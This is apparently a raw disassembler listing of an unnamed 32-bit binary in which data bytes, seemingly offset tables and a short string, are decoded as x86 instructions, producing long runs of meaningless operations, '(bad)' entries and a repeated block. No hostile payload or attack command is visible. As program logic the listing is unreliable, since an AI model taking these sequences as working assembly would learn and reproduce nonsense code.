  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [edx+edi*1+0x3],dl
  412427:	add    BYTE PTR [edx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
